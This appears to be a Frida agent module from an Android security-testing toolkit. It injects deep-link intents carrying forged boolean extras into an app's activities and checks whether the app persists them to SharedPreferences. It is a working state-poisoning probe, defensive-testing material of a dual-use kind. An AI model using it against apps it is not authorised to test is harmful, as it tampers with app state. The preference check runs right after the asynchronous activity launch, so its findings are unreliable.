/*
 * D_057 — Deep-link state poisoner.
 *
 * For each (deep_link_activity, poison_flag) pair, fires
 * Intent.setData + putExtra(flag, true) + startActivity, then reads
 * SharedPreferences to detect any flag the app persisted. The
 * post_action_check field of the payload names which preference
 * key to inspect.
 */

import { Java } from "../lib/java_ready.js";
import { sendError } from "../lib/send.js";

interface PoisonPayload {
    deep_link_activities: string[];
    poison_flags: string[];
    post_action_check?: string;
    safety_budget?: any;
}
interface PoisonResult {
    fired: number;
    persisted_flags: { flag: string; activity: string }[];
    duration_ms: number;
}

async function statepoisoner(payload: PoisonPayload): Promise<PoisonResult> {
    const max = Math.min(payload.safety_budget?.max_actions_total ?? 30, 60);
    const window_s = payload.safety_budget?.wall_clock_budget_s ?? 30;
    let fired = 0;
    const persisted: any[] = [];
    const start = Date.now();

    return new Promise((resolve) => {
        Java.perform(() => {
            try {
                const ActivityThread = Java.use("android.app.ActivityThread");
                const Intent = Java.use("android.content.Intent");
                const ComponentName = Java.use("android.content.ComponentName");
                const ctx = ActivityThread.currentApplication().getApplicationContext();
                const pkg = ctx.getPackageName();
                const prefs = ctx.getSharedPreferences("default", 0);

                let count = 0;
                outer:
                for (const activity of payload.deep_link_activities) {
                    for (const flag of payload.poison_flags) {
                        if (count >= max) break outer;
                        if (Date.now() - start >= window_s * 1000) break outer;
                        try {
                            const intent = Intent.$new("android.intent.action.VIEW");
                            intent.setComponent(ComponentName.$new(pkg, activity));
                            intent.putExtra(flag, true);
                            intent.addFlags(0x10000000);
                            ctx.startActivity(intent);
                            fired++;
                            // Brief delay to let the activity run
                            // (caller window will absorb)
                            const v = prefs.getBoolean(flag, false);
                            if (v) persisted.push({ flag, activity });
                        } catch (_) { /* ignore */ }
                        count++;
                    }
                }
            } catch (e: any) {
                sendError(`D_057: ${e.message}`);
            }
            resolve({
                fired,
                persisted_flags: persisted,
                duration_ms: Date.now() - start,
            });
        });
    });
}

rpc.exports = { statepoisoner };
